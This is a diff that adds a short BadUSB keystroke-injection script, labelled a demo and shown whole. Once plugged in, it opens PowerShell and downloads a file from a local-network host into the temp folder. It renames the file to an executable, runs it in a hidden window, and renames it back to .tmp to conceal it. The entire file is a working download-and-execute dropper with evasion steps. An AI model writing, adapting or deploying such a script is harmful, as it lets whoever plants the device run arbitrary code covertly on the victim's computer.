@@ -1,0 +1,40 @@
+REM BadUSB demo
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+
+STRING $url  = "http://192.168.58.1:8000/config_vbox.tmp"
+ENTER
+DELAY 100
+
+STRING $tmp = Join-Path (Get-Item $env:TEMP).FullName "2fd19d11-d4b7-46d1-94db-7edd16980d15.tmp"
+ENTER
+DELAY 100
+
+STRING $exe = Join-Path (Get-Item $env:TEMP).FullName "2fd19d11-d4b7-46d1-94db-7edd16980d15.exe"
+ENTER
+DELAY 100
+
+STRING Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing
+ENTER
+DELAY 100
+
+STRING Move-Item -Path $tmp -Destination $exe -Force
+ENTER
+DELAY 100
+
+STRING Start-Process $exe -WindowStyle Hidden
+ENTER
+DELAY 100
+
+STRING Move-Item -Path $exe -Destination $tmp -Force
+ENTER
+DELAY 100
+
+REM STRING exit
+REM ENTER
